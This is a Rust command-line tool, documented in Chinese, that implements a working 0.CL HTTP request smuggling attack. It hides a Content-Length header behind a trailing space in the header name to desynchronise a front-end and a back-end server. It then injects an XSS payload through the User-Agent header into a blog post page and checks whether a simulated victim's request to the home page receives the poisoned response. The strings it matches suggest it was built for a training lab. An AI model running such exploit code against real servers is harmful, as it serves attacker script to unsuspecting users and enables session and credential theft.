#!/usr/bin/env rust-script
//! name: zc0cl
//! description: 0.CL 调谐与利用探针 - 按「隐藏 Content-Length 头(名字带尾空格)的前端/后端分歧」双发配方打点:attack1 = 立即 200 静态 gadget + `Content-Length : N`(自身无体,后端等 N 字节),attack2 = 恰好 N 字节前缀(被后端当 attack1 的体吃掉,前端按 Content-Length 正常成帧) + 一个完整请求 R(后端答一条供前端配对) + 一条截断的 XSS 请求 T(后端挂起等下一个客户端字节补齐,典型即受害者 GET /);逐轮报告 attack1 是否早响应、attack2 回了几条响应(出现 /wrtz 404 或多于一条即分叉成立)、受害者探针是否拿到被投毒的帖子页
//! version: 1.0.0
//! args: <base-url> [--gadget PATH] [--method1 GET] [--probe-path /wrtz] [--post-id 1] [--ua PAYLOAD] [--rounds N] [--gap-ms N] [--probe-ms N] [--read-ms N] [--idle-ms N] [--sim-victim] [--victim-delay-ms N] [--victim-read-ms N] [--victim-conns N] [--cache-bust] [--skip-attack2] [--selftest]
//! keywords: smuggling, 0cl, desync, response-queue, poisoning, xss, probe, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let _ = tcp.set_read_timeout(Some(Duration::from_millis(300)));
    let _ = tcp.set_write_timeout(Some(Duration::from_millis(5000)));
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    let deadline = Instant::now() + Duration::from_secs(12);
    loop {
        let rustls::StreamOwned { conn, sock } = &mut s;
        match conn.complete_io(sock) {
            Ok(_) => break,
            Err(e) => {
                let msg = format!("{e}");
                let would_block = msg.contains("WouldBlock") || msg.contains("timed out") || msg.contains("Resource temporarily unavailable");
                if would_block && Instant::now() < deadline {
                    timeout::check();
                    continue;
                }
                return Err(format!("handshake: {e}"));
            }
        }
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(120))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

fn read_until(s: &mut Tls, total_ms: u64, idle_ms: u64) -> Vec<u8> {
    let start = Instant::now();
    let mut buf = Vec::new();
    let mut last = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        timeout::check();
        if start.elapsed() >= Duration::from_millis(total_ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                last = Instant::now();
            }
            Err(_) => {
                if !buf.is_empty() && last.elapsed() >= Duration::from_millis(idle_ms) {
                    break;
                }
            }
        }
    }
    buf
}

fn statuses(buf: &[u8]) -> Vec<String> {
    let text = String::from_utf8_lossy(buf);
    let mut out = Vec::new();
    for line in text.split("\r\n") {
        if line.starts_with("HTTP/1.") {
            out.push(line.to_string());
        }
    }
    out
}

fn summarize(buf: &[u8], needle: &str) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    json!({
        "bytes": buf.len(),
        "status_lines": statuses(buf),
        "status_count": statuses(buf).len(),
        "hits": text.matches(needle).count(),
        "post_page": text.contains("Leave a comment") || text.contains("Tracking Your Kids"),
        "post_page_strict": text.contains("name=\"userAgent\"") || text.contains("<h1>Comments</h1>") || text.contains("name=userAgent"),
        "preview": text.chars().take(120).collect::<String>(),
    })
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut base = String::new();
    let mut host_override: Option<String> = None;
    let mut gadget = "/resources/images/blog.svg".to_string();
    let mut gadget2 = String::new();
    let mut method1 = "GET".to_string();
    let mut probe_path = "/wrtz".to_string();
    let mut post_id = "1".to_string();
    let mut ua = "\"><svg onload=alert(1)>".to_string();
    let mut rounds: u64 = 1;
    let mut gap_ms: u64 = 200;
    let mut probe_ms: u64 = 800;
    let mut read_ms: u64 = 2500;
    let mut idle_ms: u64 = 400;
    let mut sim_victim = false;
    let mut victim_delay_ms: u64 = 300;
    let mut victim_read_ms: u64 = 4000;
    let mut victim_conns: u64 = 1;
    let mut cache_bust = false;
    let mut skip_attack2 = false;
    let mut pipeline = false;
    let mut extra1: Vec<String> = Vec::new();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--selftest" => {
                let ok = statuses(b"HTTP/1.1 200 OK\r\n\r\nHTTP/1.1 404 Not Found\r\n").len() == 2;
                pi_rust_lib::report::success(
                    "zc0cl",
                    json!({"selftest": if ok {"ok"} else {"fail"}, "status_split": statuses(b"HTTP/1.1 200 OK\r\n\r\nHTTP/1.1 404 Not Found\r\n").len()}),
                    "response splitter is the pure root",
                )
                .unwrap_or(());
                return;
            }
            "--host" => {
                i += 1;
                host_override = args.get(i).cloned();
            }
            "--gadget" => {
                i += 1;
                gadget = args.get(i).cloned().unwrap_or(gadget);
            }
            "--gadget2" => {
                i += 1;
                gadget2 = args.get(i).cloned().unwrap_or(gadget2);
            }
            "--method1" => {
                i += 1;
                method1 = args.get(i).cloned().unwrap_or(method1);
            }
            "--probe-path" => {
                i += 1;
                probe_path = args.get(i).cloned().unwrap_or(probe_path);
            }
            "--post-id" => {
                i += 1;
                post_id = args.get(i).cloned().unwrap_or(post_id);
            }
            "--ua" => {
                i += 1;
                ua = args.get(i).cloned().unwrap_or(ua);
            }
            "--rounds" => {
                i += 1;
                rounds = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(rounds);
            }
            "--gap-ms" => {
                i += 1;
                gap_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(gap_ms);
            }
            "--probe-ms" => {
                i += 1;
                probe_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(probe_ms);
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--idle-ms" => {
                i += 1;
                idle_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(idle_ms);
            }
            "--victim-delay-ms" => {
                i += 1;
                victim_delay_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(victim_delay_ms);
            }
            "--victim-read-ms" => {
                i += 1;
                victim_read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(victim_read_ms);
            }
            "--victim-conns" => {
                i += 1;
                victim_conns = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(victim_conns);
            }
            "--sim-victim" => sim_victim = true,
            "--cache-bust" => cache_bust = true,
            "--skip-attack2" => skip_attack2 = true,
            "--pipeline" => pipeline = true,
            "--header1" => {
                i += 1;
                if let Some(h) = args.get(i) {
                    extra1.push(h.clone());
                }
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "zc0cl",
            "usage",
            "call as: zc0cl <base-url> [--method1 GET] [--rounds N] [--sim-victim] [--cache-bust]",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = host_override.unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);
    let needle = "onload=alert";

    let mut log: Vec<Value> = Vec::new();
    let mut last_err = String::new();
    let mut desync_rounds: u64 = 0;
    let mut victim_hits: u64 = 0;
    for round in 0..rounds {
        if round > 0 && gap_ms > 0 {
            std::thread::sleep(Duration::from_millis(gap_ms));
        }
        timeout::check();
        timeout::check();
        eprintln!("[zc0cl] round {round} start (pipeline={pipeline})");
        let cb = if cache_bust { format!("?cb={round}") } else { String::new() };
        let gurl = format!("{gadget}{cb}");
        let gurl2 = if gadget2.is_empty() { gurl.clone() } else { format!("{gadget2}{cb}") };
        let t = format!("GET /post?postId={post_id} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}");
        let r = format!("GET {probe_path}{round} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n");
        let body = format!("{r}{t}");
        let m = body.len();
        let hdr2 = format!("GET {gurl2} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {m}\r\nConnection: keep-alive\r\n\r\n");
        let n = hdr2.len();
        let extra_block = extra1.iter().map(|h| format!("{h}\r\n")).collect::<String>();
        let attack1 = format!("{method1} {gurl} HTTP/1.1\r\nHost: {host}\r\n{extra_block}Content-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: /\r\nConnection: keep-alive\r\nContent-Length : {n}\r\n\r\n");
        let attack2 = format!("{hdr2}{body}");
        let victim = format!("GET / HTTP/1.1\r\nHost: {host}\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n");
        let mut row = json!({"round": round, "n": n, "m": m, "attack1_len": attack1.len(), "attack2_len": attack2.len()});

        let mut c1 = match connect(&host, port) {
            Ok(s) => s,
            Err(e) => {
                last_err = e;
                break;
            }
        };
        if pipeline && !skip_attack2 {
            let both = format!("{attack1}{attack2}");
            if let Err(e) = c1.write_all(both.as_bytes()) {
                last_err = format!("pipeline write: {e}");
                break;
            }
            let _ = c1.flush();
            row["a1_early_response"] = json!(null);
            eprintln!("[zc0cl] round {round} pipeline write {} bytes", both.len());
            let a2 = read_until(&mut c1, read_ms, idle_ms);
            let st = statuses(&a2);
            let desync = st.len() >= 2 || st.iter().any(|s| s.contains("404"));
            if desync {
                desync_rounds += 1;
            }
            row["a2_resp"] = summarize(&a2, needle);
            row["desync"] = json!(desync);
        } else {
            if let Err(e) = c1.write_all(attack1.as_bytes()) {
                last_err = format!("attack1 write: {e}");
                break;
            }
            let _ = c1.flush();
            let early = read_until(&mut c1, probe_ms, probe_ms);
            row["a1_early"] = summarize(&early, needle);
            row["a1_early_response"] = json!(!early.is_empty());
            if !skip_attack2 {
                if let Err(e) = c1.write_all(attack2.as_bytes()) {
                    last_err = format!("attack2 write: {e}");
                    break;
                }
                let _ = c1.flush();
                let a2 = read_until(&mut c1, read_ms, idle_ms);
                let st = statuses(&a2);
                let desync = st.len() >= 2 || st.iter().any(|s| s.contains("404"));
                if desync {
                    desync_rounds += 1;
                }
                row["a2_resp"] = summarize(&a2, needle);
                row["desync"] = json!(desync);
            }
        }

        if sim_victim {
            if victim_delay_ms > 0 {
                std::thread::sleep(Duration::from_millis(victim_delay_ms));
            }
            eprintln!("[zc0cl] round {round} victim probes x{victim_conns}");
            let mut vs: Vec<Value> = Vec::new();
            for _vi in 0..victim_conns {
                timeout::check();
                let vr = (|| -> Result<Value, String> {
                    let mut c = connect(&host, port)?;
                    c.write_all(victim.as_bytes()).map_err(|e| e.to_string())?;
                    let _ = c.flush();
                    let b = read_until(&mut c, victim_read_ms, 500);
                    Ok(summarize(&b, needle))
                })();
                match vr {
                    Ok(v) => {
                        if v["hits"].as_u64().unwrap_or(0) > 0 {
                            victim_hits += 1;
                        }
                        vs.push(v);
                    }
                    Err(e) => vs.push(json!({"error": e})),
                }
            }
            row["victim"] = json!(vs);
        }
        drop(c1);
        log.push(row);
        eprintln!("[zc0cl] round {round} done");
    }
    let data = json!({
        "host": host,
        "gadget": gadget,
        "method1": method1,
        "pipeline": pipeline,
        "cache_bust": cache_bust,
        "rounds": log,
        "desync_rounds": desync_rounds,
        "victim_hits": victim_hits,
        "last_error": last_err,
    });
    pi_rust_lib::report::success("zc0cl", data, "desync_rounds>0 proves the split; victim_hits>0 proves delivery").unwrap_or(());
}
